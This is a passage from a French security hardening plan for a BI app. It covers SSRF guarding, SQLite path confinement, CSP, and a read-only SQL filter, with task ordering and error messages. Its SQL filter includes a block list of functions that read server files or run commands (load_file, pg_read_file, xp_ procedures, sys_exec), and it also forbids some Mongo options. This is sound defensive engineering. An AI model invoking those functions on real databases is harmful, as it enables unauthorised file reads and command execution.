- Vérifier par recherche qu'il ne reste **aucun** `react-markdown` importé ailleurs que dans `SafeMarkdown.tsx`.
- Le bouton « Markdown » (téléchargement `.md`) exporte le texte brut : risque résiduel hors application (§ 7, R-6), pas de changement dans ce sprint.

### US-5 🔒 — S9 partiel : CSP `img-src` (sous-étape 2.5)

**T-3 — `next.config.mjs` ⚠️ VALIDATION HUMAINE REQUISE**
```js
async headers() {
  return [{ source: '/:path*', headers: [{ key: 'Content-Security-Policy', value: "img-src 'self' data: blob:" }] }];
},
```
- Aucune autre directive dans ce sprint (pas de `default-src`, qui casserait scripts/polices).
- Vérifier en `npm run build && npm run start` **et** en `npm run dev` (l'overlay de dev Next ne charge pas d'images distantes).
- Ne pas doubler l'en-tête par un `<meta http-equiv>`.

### US-2 🔒 — S2 : SQLite confiné (sous-étape 2.2)

**T-4 — `src/server/connectors/sqlite-path.ts` (nouveau, sous `connectors/**` ⚠️)**
```ts
export class SqlitePathError extends Error {}
/** Renvoie le chemin réel (realpath) du fichier autorisé ou lève SqlitePathError avec un message générique. */
export function resolveSqlitePath(input: string, env?: NodeJS.ProcessEnv): string;
```
Algorithme (ordre impératif) :
1. `root = env.BI_SQLITE_DIR?.trim()` ; absent → `SqlitePathError('SQLite est désactivé sur ce serveur : l\'administrateur doit définir BI_SQLITE_DIR.')`.
2. `rootReal = fs.realpathSync(path.resolve(root))` ; doit être un dossier. **Refuser** la configuration si `rootReal` est égal à, parent de, ou contenu dans `realpath(BI_DATA_DIR || ./data)` (message serveur générique « Configuration SQLite invalide. », détail en `console.error` sans chemin client).
3. `input` : `typeof === 'string'`, `trim()`, non vide, sans octet nul, longueur ≤ 260 ; sinon refus (message « Chemin SQLite refusé : … »).
4. `candidate = path.resolve(rootReal, input)` (un absolu reste absolu, un relatif est rattaché à la racine).
5. `basename(candidate)` doit respecter `/^[\p{L}\p{N} _.\-]+\.(sqlite3?|db)$/iu` (exclut `:memory:`, `file:…`, flux alternatifs NTFS `x.db:flux`).
6. `fs.lstatSync(candidate)` : `ENOENT` → « Fichier SQLite introuvable dans le dossier autorisé. » ; `isSymbolicLink()` → refus ; `!isFile()` → refus.
7. `real = fs.realpathSync(candidate)` ; `rel = path.relative(rootReal, real)` ; confiné ssi `rel !== '' && !rel.startsWith('..') && !path.isAbsolute(rel)` (gère les dossiers intermédiaires liés et la casse Windows via `path.relative`).
8. Renvoyer `real` (et c'est `real` qui est ouvert, pas `input`).
- Messages **sans** chemin (ni racine, ni entrée).

**T-5 — Brancher dans `sql.ts` ⚠️ + micro-copie `ConnectorsModal.tsx`**
- `withSqlite` : `new Database(resolveSqlitePath(c.path), { readonly: true, fileMustExist: true })`.
- `friendly()` (index.ts) : laisser passer le message de `SqlitePathError` tel quel (déjà en français et générique).
- `ConnectorsModal.tsx` (ligne 118) : libellé « Fichier SQLite (dans le dossier autorisé par l'administrateur) », placeholder `ventes.sqlite` ; le libellé de source (`c.path?.split('/')`) doit aussi gérer `\` (`split(/[\\/]/)`).

### US-3 🔒 — S1 : garde anti-SSRF (sous-étape 2.3)

#### Contrat des variables d'environnement

| Variable | Valeurs | Défaut | Effet |
|---|---|---|---|
| `BI_NETWORK_POLICY` | `public` \| `allowlist` | `public` | `public` : destinations publiques autorisées, internes refusées sauf liste blanche. `allowlist` : seules les entrées de `BI_ALLOWED_HOSTS`. Valeur inconnue → traitée comme `allowlist` (échec fermé) + `console.warn`. |
| `BI_ALLOWED_HOSTS` | liste séparée par virgules | vide | Entrées : `hote.exemple.com`, `*.exemple.com` (sous-domaines uniquement), `hote:port`, IPv4, IPv6 (`[fd00::5]` ou `[fd00::5]:8000`), CIDR (`10.0.0.0/8`, `fd00::/8`). Un **nom** en liste blanche autorise toutes ses adresses résolues (sauf toujours-interdites) ; une **IP/CIDR** autorise les adresses correspondantes quel que soit le nom. Port facultatif : s'il est indiqué, il doit correspondre au port effectif (443/80 par défaut pour http(s), port DB sinon). Entrées invalides ignorées + `console.warn` (sans données utilisateur). |
| `BI_SQLITE_DIR` | chemin de dossier | non défini | Voir US-2. |

Lecture : à chaque appel, analyse mémoïsée sur la chaîne brute (permet les tests en modifiant `process.env`).

#### T-6 — `src/server/net/policy.ts` (nouveau)
```ts
export class NetworkPolicyError extends Error { readonly code = 'NETWORK_POLICY'; }
export const POLICY_MESSAGE = "Destination refusée par la politique réseau du serveur (adresse interne ou non autorisée). Si cette source est légitime, demandez à l'administrateur de l'ajouter à BI_ALLOWED_HOSTS.";
export const INVALID_HOST = 'Hôte invalide.';

export function isAlwaysBlocked(ip: string): boolean;          // link-local, 0.0.0.0/8, ::, multicast, broadcast
export function isInternal(ip: string): boolean;               // privé, loopback, CGNAT, réservé, ULA, documentation…
export function isAllowlisted(host: string, port: number, ip?: string): boolean;
export function isAllowlistMode(): boolean;
/** Valide la syntaxe d'un hôte (nom DNS ou IP littérale, sans '/', '\\', '@', espace, '%'). Renvoie l'hôte normalisé (minuscules, sans point final, crochets IPv6 retirés). */
export function assertHostSyntax(host: string): string;
export type Resolver = (host: string) => Promise<{ address: string; family: number }[]>;
/** Résout et vérifie TOUTES les adresses ; renvoie la première autorisée (préférence IPv4). Lève NetworkPolicyError(POLICY_MESSAGE). */
export async function resolveAllowed(host: string, port: number, resolver?: Resolver): Promise<{ address: string; family: 4 | 6 }>;
/** Fonction `lookup` pour http(s).request / net.connect : même contrôle, compatible options.all. */
export function guardedLookup(port: number, resolver?: Resolver): import('node:net').LookupFunction;
/** Analyse une URI MongoDB : hôtes (multi-hôtes, IPv6, SRV), options interdites. */
export async function assertMongoUriAllowed(uri: string, resolver?: Resolver): Promise<void>;
```
Détails obligatoires :
- **Plages internes** (`net.BlockList`, construit une fois) — IPv4 : `0.0.0.0/8`*, `10.0.0.0/8`, `100.64.0.0/10`, `127.0.0.0/8`, `169.254.0.0/16`*, `172.16.0.0/12`, `192.0.0.0/24`, `192.0.2.0/24`, `192.168.0.0/16`, `198.18.0.0/15`, `198.51.100.0/24`, `203.0.113.0/24`, `224.0.0.0/4`*, `240.0.0.0/4`* (inclut `255.255.255.255`) ; IPv6 : `::/128`*, `::1/128`, `64:ff9b::/96`, `100::/64`, `2001:db8::/32`, `2002::/16`, `fc00::/7`, `fe80::/10`*, `ff00::/8`*. (* = toujours interdites.)
- **IPv6 à IPv4 embarquée** : `::ffff:a.b.c.d` (et forme hexadécimale `::ffff:7f00:1`) → extraire l'IPv4 et la classer comme telle. `64:ff9b::/96` et `2002::/16` sont classées internes (pas d'extraction).
- **Toutes** les adresses renvoyées par le résolveur doivent être autorisées (un enregistrement mixte public + interne est refusé).
- Mode `allowlist` : refus si ni l'hôte ni l'IP ne sont en liste blanche, même pour une IP publique.
- Résolveur par défaut : `dns.promises.lookup(host, { all: true, verbatim: true })` (utilise aussi `/etc/hosts`, comme les pilotes).
- `guardedLookup` : signature `(hostname, options, callback)` ; si `options.all` → `callback(null, [{address, family}])`, sinon `callback(null, address, family)` ; erreurs → `callback(new NetworkPolicyError(POLICY_MESSAGE))`.
- **Mongo** (`assertMongoUriAllowed`) : schéma `mongodb://` ou `mongodb+srv://` uniquement ; autorité = entre `://` et le premier `/` ou `?`, après le dernier `@` ; hôtes séparés par `,` ; hôte commençant par `%2F`/`/` (socket Unix) → `INVALID_HOST` ; `+srv` → `dns.promises.resolveSrv('_mongodb._tcp.' + host)` puis vérifier **chaque** cible (nom + port) ; options **interdites** (insensibles à la casse) : `proxyHost`, `proxyPort`, `proxyUsername`, `proxyPassword`, `tlsCAFile`, `tlsCertificateKeyFile`, `tlsCertificateKeyFilePassword`, `tlsCRLFile`, `authMechanismProperties`, et `authMechanism` ∈ {`MONGODB-AWS`, `MONGODB-OIDC`, `GSSAPI`, `MONGODB-X509`, `PLAIN`} → message « Option de connexion MongoDB non autorisée (<nom de l'option>). » (MONGODB-AWS/OIDC feraient utiliser au pilote les identités cloud **du serveur** ; `proxyHost` contournerait la garde via SOCKS5).

#### T-7 — `src/server/net/safe-fetch.ts` (nouveau)
```ts
export interface SafeFetchInit {
  method?: 'GET' | 'POST';
  headers?: Record<string, string>;
  body?: string;
  timeoutMs?: number;            // défaut 25 000 ; délai total (connexion + en-têtes) ; null = aucun (flux LLM : délai de connexion seulement)
  maxBytes?: number | null;      // défaut 20 * 1024 * 1024 (après décompression) ; null = illimité (flux LLM)
  httpsRequiredUnlessAllowlisted?: boolean; // true pour baseUrl LLM
}
export async function safeFetch(url: string, init?: SafeFetchInit): Promise<Response>;
export const REDIRECT_MESSAGE = 'Redirection refusée : indiquez directement l\'URL finale (les redirections ne sont pas suivies).';
export const BAD_URL_MESSAGE = 'Adresse invalide : seules les URL http(s) sans identifiants intégrés sont acceptées.';
export const TOO_LARGE_MESSAGE = 'Réponse trop volumineuse (limite 20 Mo).';
```
Comportement :
1. `new URL(url)` ; protocole `http:`/`https:` uniquement ; `username`/`password` vides ; sinon `BAD_URL_MESSAGE`. Le parseur WHATWG normalise les formes `2130706433`, `0x7f000001`, `0177.0.0.1` en `127.0.0.1` (contrôle sur `url.hostname`).
2. Port effectif = `url.port || (https ? 443 : 80)`.
3. Si `httpsRequiredUnlessAllowlisted` et protocole `http:` et hôte non en liste blanche → message LLM dédié (§ 6).
4. Hôte IP littérale → contrôle direct (`isAlwaysBlocked`/`isInternal`/liste blanche) ; nom → `lookup: guardedLookup(port)`.
5. `http(s).request(url, { method, headers, lookup, signal, agent: false })` ; en-têtes imposés : `accept-encoding: gzip, deflate, br`, `user-agent: bi-advisor` ; `content-length` calculé pour POST.
6. Statut `3xx` → détruire la réponse, lever `NetworkPolicyError(REDIRECT_MESSAGE)`.
7. Décompression selon `content-encoding` (`zlib.createGunzip/createInflate/createBrotliDecompress`) ; compteur d'octets **après** décompression → au-delà de `maxBytes`, `destroy()` + `TOO_LARGE_MESSAGE` (protège des bombes de décompression).
8. Construire `new Response(status 204/304 ? null : Readable.toWeb(stream), { status, statusText, headers })` (supprimer `content-encoding`/`content-length` des en-têtes recopiés).
9. Ne jamais journaliser l'URL complète ni les en-têtes (secrets en query/headers).

#### T-8 — `saas.ts` ⚠️ (REST, Airtable, Notion)
- `jfetch` → `safeFetch` (tous les connecteurs ; Airtable/Notion ont des hôtes fixes publics, le passage par la garde est neutre et unifie le code).
- Erreurs : plus de corps distant ni de `cause.message` dans les messages. Nouveaux messages : 401/403 → « `<label>` : accès refusé (`<status>`) — vérifiez le jeton / les droits. » ; 404 → inchangé ; autres → « `<label>` HTTP `<status>`. » ; erreur réseau → message de `NetworkPolicyError` tel quel, sinon code mappé (`ECONNREFUSED`, `ENOTFOUND`, `ETIMEDOUT`, `AbortError`) vers les libellés de `friendly()`, sinon « `<label>` injoignable. ».
- `restHeaders` : refuser (insensible à la casse) `host`, `content-length`, `transfer-encoding`, `connection`, `upgrade`, `proxy-authorization`, `te`, `trailer`, `keep-alive`, `expect` → « En-tête non autorisé : `<Nom>`. » ; valeurs non-chaînes ou contenant `\r`/`\n` → « En-têtes : JSON invalide (ex. {"X-Api-Version":"2"}). ».
- `fetchRest` : la vérification `^https?://` est remplacée par celle de `safeFetch` ; chaque page passe par `safeFetch` (le paramètre de pagination ne change pas l'hôte, mais l'URL est revalidée à chaque appel).

#### T-9 — `odoo.ts` ⚠️
- `rpc()` : `safeFetch(\`${base}/jsonrpc\`, { method: 'POST', …, timeoutMs: 20000 })`. Une redirection (ex. `http://` → `https://`) produit `REDIRECT_MESSAGE` : documenter « saisissez l'URL https finale ».
- `throw new Error(\`Odoo HTTP ${res.status}\`)` conservé (non verbeux). Les messages `j.error.data.message` d'Odoo restent renvoyés (cible autorisée, utile au diagnostic) — tronqués à 200 caractères.

#### T-10 — LLM : `llm.ts`, `api/llm/chat/route.ts`, `api/llm/test/route.ts`
- `BASEURL_PROVIDERS = ['openai', 'deepseek', 'nvidia']`. Routes : si `baseUrl` non vide et fournisseur hors liste → 400 / `{ ok:false, message }` « URL de base non prise en charge pour ce fournisseur. » (au lieu de l'ignorer silencieusement).
- `resolveBase(provider, baseUrl)` renvoie `{ url: string; custom: boolean }` ; `custom = true` si `baseUrl` fourni **et** différent (après normalisation, sans `/` final) de `OPENAI_BASES[provider]`.
- Appels `custom` → `safeFetch(url, { httpsRequiredUnlessAllowlisted: true, timeoutMs: … , maxBytes: … })` ; appels vers les bases officielles et Anthropic/Gemini → `fetch` global inchangé (hôtes constants).
  - `/chat/completions` (flux) : `timeoutMs` = 30 000 pour l'obtention des en-têtes puis aucun délai sur le flux ; `maxBytes: null`.
  - `/models` : `timeoutMs: 20000`, `maxBytes` 5 Mo.
- `ensureOk` : si `custom`, message = « `<label>` (`<status>`) `<hint>` » **sans** `detail` ; sinon, `detail` limité à une chaîne (`j.error.message` si string) tronquée à 200 caractères, jamais `JSON.stringify(j)`.
- `testKey` (catch) : remplacer `Réseau indisponible : ${e.message}` par le message de `NetworkPolicyError` / `ProviderError` s'il y en a un, sinon « Réseau indisponible : fournisseur injoignable. ».
- Le cas « clé facultative si `nvidia` + `baseUrl` » est conservé (NIM local), désormais conditionné par la garde (donc par `BI_ALLOWED_HOSTS` pour `localhost`).
- Invariant BYOK : aucune clé, URL complète ni en-tête dans les logs ou messages ; `safeFetch` ne logue rien.

#### T-11 — Hôtes SQL et Mongo : `sql.ts` ⚠️, `mongo.ts` ⚠️
- **SQL (pg, mysql, mssql)** : `c.url` **refusé** (« Chaîne de connexion non prise en charge : renseignez l'hôte, le port et les identifiants. ») — l'UI ne l'utilise pas (vérifié : `ConnectorsModal` ne propose que hôte/port) et une chaîne permettrait des options dangereuses (`multipleStatements=true`, `host=/socket`, etc.).
- `host = assertHostSyntax(c.host)` ; MSSQL : accepter `hote\INSTANCE` → `instanceName` séparé (`/^[A-Za-z0-9_$]{1,16}$/`), l'hôte seul est validé ; `port` entier 1–65535.
- `const { address } = await resolveAllowed(host, port)` puis connexion à **`address`** (épinglage) :
  - pg : `host: address`, et si SSL : `ssl: { rejectUnauthorized: false, servername: <nom d'origine si ce n'est pas une IP> }` (comportement TLS inchangé ; la vérification du certificat relève de S10).
  - mysql2 : `host: address`, `multipleStatements: false`, `flags: ['-LOCAL_FILES']` (défense contre un serveur MySQL malveillant demandant des fichiers, même si mysql2 ≥ 2 refuse sans `infileStreamFactory`).
  - mssql : `server: address`, `options.instanceName` si fourni. **Point à vérifier par le Dev** : avertissement Node « Setting the TLS ServerName to an IP address » avec `encrypt: true` ; s'il est bloquant, repli documenté sur un contrôle sans épinglage pour MSSQL uniquement (risque résiduel R-3) — à consigner dans `dev-notes.md`.
- **Mongo** : `await assertMongoUriAllowed(c.url)` avant `new MongoClient(...)`. Pas d'épinglage (SRV, découverte de topologie) : risque résiduel R-2 documenté.

#### T-12 — `index.ts` ⚠️ : `friendly()` et non-verbosité
- `NetworkPolicyError`, `SqlitePathError`, `ReadOnlyError` (T-13) → message tel quel.
- Ajouter : `/maximum statement execution time|max_statement_time|statement timeout|canceling statement due to statement timeout|ETIMEOUT|Timeout: Request failed to complete/i` → « Requête trop longue : délai de 30 s dépassé. Ajoutez des filtres ou une agrégation. » (à placer **avant** la règle générique `timeout` existante).
- Le repli « renvoyer `m` brut » reste (S10, hors périmètre) : signalé en suite.

### US-4 🔒 — S3 : lecture seule renforcée (sous-étape 2.4)

#### T-13 — `src/server/connectors/sql-guard.ts` (nouveau, ⚠️ garde-fou lecture seule)
```ts
export type SqlDialect = 'postgres' | 'mysql' | 'mssql' | 'sqlite';
export const MAX_ROWS = 1000;
export const QUERY_TIMEOUT_MS = 30_000;
export class ReadOnlyError extends Error {}
/** Renvoie le code SQL où littéraux, identifiants cités et commentaires de ligne sont neutralisés. Lève ReadOnlyError si mal formé. */
export function maskSql(sql: string, dialect: SqlDialect): string;
/** Renvoie l'instruction prête à exécuter (trim, sans ';' final) ou lève ReadOnlyError. */
export function assertReadOnly(sql: string, dialect: SqlDialect): string;
```
Analyseur lexical (`maskSql`, parcours caractère par caractère) :

| Élément | postgres | mysql | mssql | sqlite |
|---|---|---|---|---|
| `'…'` (doublement `''`) | oui ; échappement `\` **seulement** si préfixe `E`/`e` | oui ; `\` = échappement, **refus** de tout littéral contenant `\` (E-SQL-6) | oui, sans `\` | oui, sans `\` |
| `"…"` | identifiant | chaîne (même règle `\`) | identifiant | identifiant |
| `` `…` `` | — (code) | identifiant | — | identifiant |
| `[…]` | — | — | identifiant | identifiant |
| `$tag$…$tag$` | chaîne (tag `[A-Za-z_]\w*` ou vide ; `$1` n'est pas un tag) | — | — | — |
| `-- ` commentaire de ligne | `--` | `--` suivi d'un blanc/contrôle ou fin, et `#` | `--` | `--` |
| `/* … */` | **refus** (E-SQL-5) | **refus** | **refus** | **refus** |

Contrôles de `assertReadOnly`, dans l'ordre, sur le code masqué :
1. Non vide, longueur ≤ 20 000 caractères.
2. Retirer les `;` et blancs finaux ; tout autre `;` → « Une seule instruction SQL est autorisée. ».
3. Premier mot ∈ {`select`, `with`} sinon « Seules les requêtes en lecture (SELECT) sont autorisées. » (parenthèse ouvrante initiale tolérée : `(SELECT …) UNION …`).
4. Liste noire (frontières de mots, insensible à la casse) → `ReadOnlyError('Mot-clé ou fonction interdit (<MOT>) : le connecteur est en lecture seule. Si c\'est un nom de colonne, placez-le entre guillemets.')` :
   - Instructions : `insert`, `update`, `delete`, `drop`, `alter`, `truncate`, `create`, `grant`, `revoke`, `merge`, `exec`, `execute`, `call`, `copy`, `attach`, `detach`, `vacuum`, `reindex`, `lock`, `set`, `reset`, `declare`, `prepare`, `deallocate`, `listen`, `notify`, `handler`, `shutdown`, `kill`, `dbcc`, `bulk`, `backup`, `restore`, `reconfigure`, `waitfor`, `into` (couvre `SELECT … INTO`, `INTO OUTFILE/DUMPFILE`) ;
   - Séquences : `for update`, `for share`, `for no key update`, `for key share`, `lock in share mode` ;
   - Fonctions (suivies de `(` éventuellement après blancs) : `load_file`, `load_extension`, `openrowset`, `opendatasource`, `openquery`, `openxml`, `xp_\w+`, `sp_\w+`, `pg_read_file`, `pg_read_binary_file`, `pg_ls_dir`, `pg_stat_file`, `pg_terminate_backend`, `pg_cancel_backend`, `pg_reload_conf`, `pg_rotate_logfile`, `pg_sleep\w*`, `pg_advisory\w*`, `pg_logical_emit_message`, `lo_import`, `lo_export`, `lo_unlink`, `dblink\w*`, `query_to_xml\w*`, `cursor_to_xml`, `set_config`, `nextval`, `setval`, `sleep`, `benchmark`, `get_lock`, `release_lock`, `sys_exec`, `sys_eval`.
   - La liste est un **minimum** : le reviewer peut l'étendre ; tout ajout doit être couvert par un cas de test.
5. `sql.ts` : supprimer l'ancien `assertReadOnly` et réexporter celui-ci (`export { assertReadOnly } from './sql-guard'`) pour ne casser aucun import.

#### T-14 — Exécution bornée et en lecture seule par SGBD (`sql.ts` ⚠️)
`querySql(kind, c, sqlRaw)` : `const sql = assertReadOnly(sqlRaw, kind)` puis :

- **PostgreSQL** — client avec `statement_timeout: QUERY_TIMEOUT_MS`, `query_timeout: QUERY_TIMEOUT_MS + 5000`, `idle_in_transaction_session_timeout: 60000`, `application_name: 'bi-advisor'` ; séquence : `BEGIN READ ONLY` → `client.query({ text: 'DECLARE bia_cur NO SCROLL CURSOR FOR ' + sql, queryMode: 'extended' })` (le protocole étendu interdit plusieurs instructions ; `DECLARE … FOR` n'accepte qu'un `SELECT`/`VALUES` et refuse les `WITH` modifiants) → `FETCH FORWARD 1001 FROM bia_cur` → `ROLLBACK` (finally). Les requêtes de schéma restent dans `BEGIN READ ONLY` (inchangé) avec le même délai.
- **MySQL / MariaDB** — `SET SESSION TRANSACTION READ ONLY` ; `START TRANSACTION READ ONLY` ; `SET SESSION sql_select_limit = 1001` ; `SET SESSION max_execution_time = 30000` puis, en cas d'erreur (MariaDB), `SET SESSION max_statement_time = 30` (erreur ignorée si les deux échouent, délai client en repli) ; lecture **en flux** via l'API cœur (`conn.connection.query(sql).stream()` ou `mysql2` non-promise) avec arrêt dès `MAX_ROWS + 1` lignes puis `conn.destroy()` ; délai client `QUERY_TIMEOUT_MS + 5000` ; `ROLLBACK` + `end()` (finally, sauf connexion détruite).
- **SQL Server** — pool `{ max: 1 }`, `options.readOnlyIntent: true` (ApplicationIntent=ReadOnly, effectif sur réplicas AG), `requestTimeout: QUERY_TIMEOUT_MS` ; `const tx = new mssql.Transaction(pool); await tx.begin(mssql.ISOLATION_LEVEL.READ_COMMITTED)` ; `new mssql.Request(tx).batch('SET ROWCOUNT 1001')` ; `new mssql.Request(tx).query(sql)` ; **toujours** `tx.rollback()` en finally (si la transaction est encore active), puis `pool.close()`. Toute écriture qui aurait échappé au filtre (ex. `SELECT INTO`) est annulée.
- **SQLite** — `const stmt = db.prepare(sql)` (lève si plusieurs instructions) ; refuser si `!stmt.reader || !stmt.readonly` (« Seules les requêtes en lecture (SELECT) sont autorisées. ») ; `for (const r of stmt.iterate()) { rows.push(r); if (rows.length > MAX_ROWS) break; }` ; `db.pragma('query_only = ON')` à l'ouverture. Pas de délai d'exécution possible (exécution synchrone) : risque résiduel R-4.
- Résultat final : `rows.slice(0, MAX_ROWS).map(sanitize)` (inchangé ; le +1 sert à détecter la troncature, réservé à une évolution ultérieure de l'UI).

#### T-15 — `testSql`/`schemaSql`
- Appliquer les mêmes délais et l'épinglage (T-11) ; pas de `assertReadOnly` (SQL interne constant). Vérifier qu'aucune requête de schéma n'est construite par concaténation de données client (SQLite : noms de tables échappés, inchangé).

#### T-16 — Documentation « compte lecture seule obligatoire » (avec T-17)
- `ConnectorsModal.tsx` (DbForm) : remplacer « Utilisez de préférence un compte dédié en lecture. » par « Utilisez **obligatoirement** un compte en lecture seule : c'est la seule garantie réelle côté base. » (le reste de la phrase sur le schéma transmis au LLM est **hors périmètre** de ce sprint — cf. audit § 2.3 — mais ne doit pas être aggravé).
- README : section dédiée avec exemples :
  - PostgreSQL : `CREATE ROLE lecteur_bi LOGIN PASSWORD '…'; GRANT CONNECT ON DATABASE ma_base TO lecteur_bi; GRANT USAGE ON SCHEMA public TO lecteur_bi; GRANT SELECT ON ALL TABLES IN SCHEMA public TO lecteur_bi; ALTER DEFAULT PRIVILEGES IN SCHEMA public GRANT SELECT ON TABLES TO lecteur_bi; ALTER ROLE lecteur_bi SET default_transaction_read_only = on;`
  - MySQL : `CREATE USER 'lecteur_bi'@'%' IDENTIFIED BY '…'; GRANT SELECT, SHOW VIEW ON ma_base.* TO 'lecteur_bi'@'%';` (sans `FILE`, `PROCESS`, `SUPER`).
  - SQL Server : `CREATE LOGIN lecteur_bi WITH PASSWORD='…'; CREATE USER lecteur_bi FOR LOGIN lecteur_bi; ALTER ROLE db_datareader ADD MEMBER lecteur_bi;` (pas de `db_owner`, pas de `sysadmin`).

#### T-17 — Documentation et configuration (`.env.example` ⚠️, `README.md`)
- `.env.example` : bloc « Sécurité des connecteurs » avec `BI_NETWORK_POLICY`, `BI_ALLOWED_HOSTS` (exemples commentés : `localhost:8000` pour NIM local, `10.0.0.0/8`, `db.interne.local:5432`), `BI_SQLITE_DIR` (exemple `./sqlite`, avertissement « jamais le dossier data/ »).
- README : § Sécurité (politique réseau, liste blanche, CSP, Markdown neutralisé, compte RO obligatoire, limites et délais) ; § Connecteurs (SQLite = fichier dans `BI_SQLITE_DIR` ; « les connexions vers des adresses internes nécessitent `BI_ALLOWED_HOSTS` ») ; § Notes de migration (changements cassants : SQLite désactivé par défaut, destinations internes bloquées, `SHOW/DESCRIBE/EXPLAIN` et commentaires `/* */` refusés, redirections non suivies, `baseUrl` refusée pour Anthropic/Gemini) ; corriger la puce « ajoutez une authentification, un rate-limit » (l'authentification existe ; rate-limit global : suite P1).
- Admin (`/admin`, vue d'ensemble) : afficher la politique réseau active est **souhaitable mais hors périmètre** (nécessiterait une route admin) → suite.

---

## 5. Ordonnancement des tâches (sous-étape 2.6)

| Ordre | Tâche | Story | Dépend de | Effort | ⚠️ |
|---|---|---|---|---|---|
| 1 | T-1 `markdown-safety.ts` + `SafeMarkdown.tsx` | US-1 | — | S | |
| 2 | T-2 branchement chat + rapport | US-1 | T-1 | XS | |
| 3 | T-3 CSP `next.config.mjs` | US-5 | — | XS | ⚠️ |
| 4 | T-4 `sqlite-path.ts` | US-2 | — | S | ⚠️ |
| 5 | T-5 branchement SQLite + micro-copie | US-2 | T-4 | XS | ⚠️ |
| 6 | T-6 `net/policy.ts` | US-3 | — | M | |
| 7 | T-7 `net/safe-fetch.ts` | US-3 | T-6 | M | |
| 8 | T-8 `saas.ts` | US-3 | T-7 | S | ⚠️ |
| 9 | T-9 `odoo.ts` | US-3 | T-7 | XS | ⚠️ |
| 10 | T-10 LLM (`llm.ts` + routes) | US-3 | T-7 | S | |
| 11 | T-11 hôtes SQL/Mongo | US-3 | T-6 | S | ⚠️ |
| 12 | T-12 `friendly()` | US-3/US-4 | T-6, T-13 | XS | ⚠️ |
| 13 | T-13 `sql-guard.ts` | US-4 | — | M | ⚠️ |
| 14 | T-14 exécution bornée par SGBD | US-4 | T-11, T-13 | M | ⚠️ |
| 15 | T-15 test/schéma | US-4 | T-14 | XS | ⚠️ |
| 16 | T-16 + T-17 documentation | toutes | toutes | S | ⚠️ (`.env.example`) |

- T-1/T-3/T-4/T-6/T-13 sont indépendantes : le Dev peut les paralléliser, mais **T-11 → T-14** touchent tous deux `sql.ts` : les réaliser dans cet ordre.
- Commits atomiques suggérés au `reviewer` (un par story) : `fix(securite): neutraliser images et liens du markdown LLM (C1)` + CSP ; `fix(securite): confiner sqlite à BI_SQLITE_DIR (S2)` ; `fix(securite): garde anti-ssrf commune (S1)` ; `fix(securite): lecture seule renforcée et bornée (S3)` ; `docs: politique réseau, compte lecture seule, migration`.
- Livraison incrémentale possible : US-1 + US-5 + US-2 (effort S) peuvent être revues/QA avant US-3/US-4 si l'humain le souhaite.

---

## 6. Catalogue des messages d'erreur (français, non verbeux)

| Code | Message exact | Émis par |
|---|---|---|
| E-NET-1 | Destination refusée par la politique réseau du serveur (adresse interne ou non autorisée). Si cette source est légitime, demandez à l'administrateur de l'ajouter à BI_ALLOWED_HOSTS. | policy / safe-fetch |
| E-NET-2 | Adresse invalide : seules les URL http(s) sans identifiants intégrés sont acceptées. | safe-fetch |
| E-NET-3 | Redirection refusée : indiquez directement l'URL finale (les redirections ne sont pas suivies). | safe-fetch |
| E-NET-4 | Réponse trop volumineuse (limite 20 Mo). | safe-fetch |
| E-NET-5 | Hôte invalide. | policy |
| E-NET-6 | En-tête non autorisé : `<Nom>`. | saas |
| E-LLM-1 | URL de base non prise en charge pour ce fournisseur. | routes LLM |
| E-LLM-2 | URL de base en http:// refusée : utilisez https:// ou faites autoriser l'hôte par l'administrateur. | safe-fetch (option LLM) |
| E-LLM-3 | Réseau indisponible : fournisseur injoignable. | llm.ts |
| E-MONGO-1 | Option de connexion MongoDB non autorisée (`<option>`). | policy |
| E-SQLITE-1 | SQLite est désactivé sur ce serveur : l'administrateur doit définir BI_SQLITE_DIR. | sqlite-path |
| E-SQLITE-2 | Chemin SQLite refusé : indiquez un fichier .sqlite, .sqlite3 ou .db situé dans le dossier autorisé. | sqlite-path |
| E-SQLITE-3 | Fichier SQLite introuvable dans le dossier autorisé. | sqlite-path |
| E-SQL-1 | Une seule instruction SQL est autorisée. | sql-guard (existant) |
| E-SQL-2 | Seules les requêtes en lecture (SELECT) sont autorisées. | sql-guard (existant) |
| E-SQL-3 | Mot-clé ou fonction interdit (`<MOT>`) : le connecteur est en lecture seule. Si c'est un nom de colonne, placez-le entre guillemets. | sql-guard |
| E-SQL-4 | Requête SQL mal formée (chaîne, identifiant ou commentaire non terminé). | sql-guard |
| E-SQL-5 | Commentaires /* */ non autorisés : utilisez -- en fin de ligne. | sql-guard |
| E-SQL-6 | MySQL : les chaînes contenant une barre oblique inverse (\) ne sont pas autorisées. | sql-guard |
| E-SQL-7 | Chaîne de connexion non prise en charge : renseignez l'hôte, le port et les identifiants. | sql.ts |
| E-SQL-8 | Requête trop longue : délai de 30 s dépassé. Ajoutez des filtres ou une agrégation. | friendly() |
| E-SQL-9 | Caractère de contrôle non autorisé dans la requête (retour chariot isolé, saut de page, séparateur Unicode…) : utilisez des fins de ligne standard. | sql-guard (arbitrage CR-16) |
| E-UI-1 | Image non affichée (protection des données) | SafeMarkdown |
| E-UI-2 | Lien externe vers `<hôte>` | SafeMarkdown (info-bulle) |

Règle générale : aucun message ne contient d'IP résolue, de chemin serveur, de corps de réponse distante (hors message d'erreur Odoo / fournisseur officiel tronqué), de clé ni d'en-tête.

---

## 7. Risques, impacts et risques résiduels

| ID | Risque | Niveau | Traitement |
|---|---|---|---|
| R-1 | **Changements cassants** : bases/NIM/API internes bloqués, SQLite désactivé, `SHOW`/`EXPLAIN`/`/* */` refusés, redirections non suivies | Élevé (exploitation) | Notes de migration README + `.env.example` ; décision humaine (§ 10, V-3/V-4) |
| R-2 | Mongo : pas d'épinglage ; un serveur Mongo public peut annoncer des membres de replica set internes (découverte de topologie) ; rebinding entre contrôle et connexion | Moyen | Documenté ; recommandation `BI_NETWORK_POLICY=allowlist` en production ; suite S4 (option `directConnection`, épinglage) |
| R-3 | MSSQL + `encrypt` + IP épinglée : avertissement Node/tedious possible ; repli sans épinglage si bloquant | Faible | Vérification Dev (T-11), consignée dans `dev-notes.md` |
| R-4 | SQLite : exécution synchrone sans délai → une requête coûteuse bloque la boucle d'événements Node (DoS) | Moyen | Plafond de lignes réduit l'impact mais pas les agrégats coûteux ; suite : exécution en `worker_threads` avec délai |
| R-5 | Liste noire SQL : faux positifs (colonne nommée `set`, `lock`, `call`…) | Faible | Message invitant à citer l'identifiant ; « Corriger avec l'IA » ; compte RO reste la vraie garantie |
